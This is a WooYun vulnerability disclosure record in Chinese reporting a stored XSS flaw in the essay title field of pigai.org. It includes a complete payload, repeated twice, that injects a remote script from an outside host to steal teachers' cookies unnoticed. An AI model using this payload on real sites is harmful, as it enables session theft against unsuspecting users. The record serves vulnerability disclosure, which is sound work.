{"id": 41988, "wybug_id": "wooyun-2014-087099", "wybug_title": "批改网存储型XSS#1", "wybug_corp": "pigai.org", "wybug_author": "Th1nk", "wybug_date": "2014-12-15 15:25", "wybug_open_date": "2015-01-29 15:26", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向公众公开  简要描述： 批改网存储型XSS，指哪打哪。 详细说明：  学生提交作文时，在作文名称处没有过滤，直接添加绑定事件。如图\n\n提交。当教师查看学生作文时，触发xss。\n\n\n\n此外为了做得更隐蔽，我们可以将作文名称尽量弄得长一点。最后构造一个完整的获取教师cookie的payload。此处利用了老师要查看该作文必须点击，所以绑定了一个onclick事件。\nToday I am going to talk about the sex education in college.\" onclick='var b=document.createElement(\"script\");b.src=\"http://mhz.pw/test3\";(document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(b);return false;' a=\"\nreturn false是为了能够成功包含进我们xss平台中的js。然后我们在js中添加一个跳转，让他跳转回正常页面。老师点击效果。\n\n\n\n\n\n这样就能无声无息的拿到老师的cookie。   漏洞证明：  学生提交作文时，在作文名称处没有过滤，直接添加绑定事件。如图\n\n提交。当教师查看学生作文时，触发xss。\n\n\n\n此外为了做得更隐蔽，我们可以将作文名称尽量弄得长一点。最后构造一个完整的获取教师cookie的payload。此处利用了老师要查看该作文必须点击，所以绑定了一个onclick事件。\nToday I am going to talk about the sex education in college.\" onclick='var b=document.createElement(\"script\");b.src=\"http://mhz.pw/test3\";(document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(b);return false;' a=\"\nreturn false是为了能够成功包含进我们xss平台中的js。然后我们在js中添加一个跳转，让他跳转回正常页面。老师点击效果。\n\n\n\n\n\n这样就能无声无息的拿到老师的cookie。   修复方案：  听说你们会送小礼物我才来的。   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-12-15 15:27 厂商回复： 稍后奉上 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}